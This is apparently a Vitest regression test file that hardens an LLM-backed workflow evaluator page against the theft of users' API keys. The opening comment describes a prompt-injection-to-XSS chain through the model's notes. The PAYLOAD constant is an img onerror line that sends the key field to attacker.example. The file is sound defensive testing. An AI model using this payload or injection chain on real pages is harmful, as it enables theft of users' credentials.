/**
 * Workflow evaluator (evaluator/) — BYOK page hardening.
 *
 * Regression: renderScore put the model's free-text `notes` into innerHTML
 * under `script-src 'unsafe-inline'`, and evaluate.js passed notes through
 * verbatim. A manual carrying a prompt injection could make the model return
 * `<img src=x onerror=…>` in a note, run script in the page and read the
 * user's Anthropic key (kept in localStorage when "remember" was on).
 */
import { readFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { afterEach, describe, expect, it, vi } from 'vitest';
import { strictPageProblems } from '../apps/ui-remix/scripts/lib/html-guard.mjs';
import { onRequestPost } from '../evaluator/functions/api/evaluate.js';

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..');
const read = (f) => readFileSync(join(ROOT, 'evaluator', f), 'utf8');
const PAYLOAD = `<img src=x onerror="location='https://attacker.example/?k='+document.querySelector('#key').value">`;

describe('evaluator page', () => {
  it('runs under a CSP with no unsafe-inline for scripts or styles', () => {
    const csp = read('_headers').match(/^\s*Content-Security-Policy:\s*(.+)$/m)?.[1] ?? '';
    const directive = (name) => csp.match(new RegExp(`${name} ([^;]*)`))?.[1] ?? '';
    expect(directive('script-src')).toBe("'self'");
    expect(directive('style-src')).toBe("'self'");
    expect(strictPageProblems(read('index.html'))).toEqual([]);
  });

  it('never parses response text as HTML', () => {
    const js = read('app.js');
    expect(js).not.toMatch(/\.(?:innerHTML|outerHTML)\s*=|insertAdjacentHTML|document\.write/);
  });

  it('keeps the key for the tab only (sessionStorage), never localStorage', () => {
    const js = read('app.js');
    expect(js).not.toMatch(/localStorage\.setItem/);
    expect(js).toMatch(/sessionStorage\.setItem\('anthropic_key'/);
  });
});

describe('POST /api/evaluate', () => {
  afterEach(() => vi.unstubAllGlobals());

  const call = async (modelJson, mode = 'score') => {
    vi.stubGlobal(
      'fetch',
      vi.fn(
        async () =>
          new Response(JSON.stringify({ content: [{ text: JSON.stringify(modelJson) }] })),
      ),
    );
    const request = new Request('https://x/api/evaluate', {
      method: 'POST',
      body: JSON.stringify({ workflow: 'x'.repeat(60), apiKey: 'sk-ant-test', mode }),
    });
    return (await onRequestPost({ request })).json();
  };

  it('returns notes only for known dimensions, as bounded plain strings', async () => {
    const j = await call({
      dims: { gate_enforceability: 0.5 },
      notes: {
        gate_enforceability: PAYLOAD,
        clarity_navigability: 'y'.repeat(5000),
        self_containment: { nested: true },
        injected_key: 'dropped',
      },
      strongest: '<b>x</b>',
      weakest: 'gate_enforceability',
      verdict: 42,
    });
    expect(Object.keys(j.notes).sort()).toEqual(
      ['clarity_navigability', 'gate_enforceability', 'self_containment'].sort(),
    );
    for (const v of Object.values(j.notes)) expect(typeof v).toBe('string');
    expect(j.notes.clarity_navigability.length).toBeLessThanOrEqual(300);
    expect(j.notes).not.toHaveProperty('injected_key');
    expect(j.strongest).toBe('');
    expect(j.weakest).toBe('gate_enforceability');
    expect(j.verdict).toBe('42');
  });

  it('returns improve-mode text as strings', async () => {
    const j = await call({ improved: ['not', 'a', 'string'], changelog: null }, 'improve');
    expect(typeof j.improved).toBe('string');
    expect(j.changelog).toBe('');
  });
});
